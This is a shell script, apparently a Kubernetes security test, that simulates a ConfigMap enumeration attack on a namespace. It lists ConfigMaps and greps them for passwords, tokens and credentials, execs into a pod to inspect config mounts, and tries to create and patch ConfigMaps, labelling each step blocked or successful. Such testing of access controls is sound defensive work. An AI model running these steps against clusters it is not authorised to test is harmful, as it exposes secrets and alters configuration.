#!/bin/sh
set -eu

# Attempts to enumerate and access ConfigMaps
# This simulates an attacker looking for configuration secrets and sensitive data

namespace="${1:-frontend}"

echo "[ATTACK] ConfigMap Enumeration Attack"
echo "[INFO] Target namespace: $namespace"

# Step 1: List all ConfigMaps
echo "[ATTACK] Enumerating ConfigMaps in namespace: $namespace"
kubectl get configmaps -n "$namespace" -o wide 2>/dev/null || echo "[BLOCKED] Cannot list ConfigMaps"

# Step 2: Try to access each ConfigMap
echo "[ATTACK] Attempting to read ConfigMap contents..."
kubectl get configmaps -n "$namespace" -o name 2>/dev/null | while read cm; do
    if [ -n "$cm" ]; then
        echo "[INFO] Reading ConfigMap: $cm"
        kubectl get "$cm" -n "$namespace" -o yaml 2>/dev/null | grep -E "(password|secret|key|token|credential)" -i || true
    fi
done

# Step 3: Try to access ConfigMaps from within pods
pod_name=$(kubectl get pods -n "$namespace" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
if [ -n "$pod_name" ]; then
    echo "[ATTACK] Attempting to access ConfigMaps from pod: $pod_name"
    
    # Check mounted ConfigMaps
    echo "[INFO] Checking mounted ConfigMaps..."
    kubectl exec -n "$namespace" "$pod_name" -- mount | grep configmap || echo "[INFO] No ConfigMaps mounted"
    
    # Try to read ConfigMap data from common mount paths
    for path in /etc/config /config /etc/conf; do
        kubectl exec -n "$namespace" "$pod_name" -- ls -la "$path" 2>/dev/null || true
    done
fi

# Step 4: Try to create/modify ConfigMaps
echo "[ATTACK] Attempting to create ConfigMap with sensitive data..."
kubectl create configmap test-config-$(date +%s) \
    --from-literal=password=test123 \
    --from-literal=api-key=secret-key \
    -n "$namespace" 2>/dev/null && \
    echo "[SUCCESS] ConfigMap created!" || \
    echo "[BLOCKED] Cannot create ConfigMap"

# Step 5: Try to patch existing ConfigMaps
echo "[ATTACK] Attempting to modify existing ConfigMaps..."
kubectl get configmaps -n "$namespace" -o name 2>/dev/null | head -1 | while read cm; do
    if [ -n "$cm" ]; then
        echo "[ATTACK] Attempting to patch: $cm"
        kubectl patch "$cm" -n "$namespace" --type='json' \
            -p='[{"op": "add", "path": "/data/test-key", "value": "test-value"}]' 2>/dev/null && \
            echo "[SUCCESS] ConfigMap patched!" || \
            echo "[BLOCKED] Cannot patch ConfigMap"
    fi
done

echo "[COMPLETE] ConfigMap enumeration attack finished"

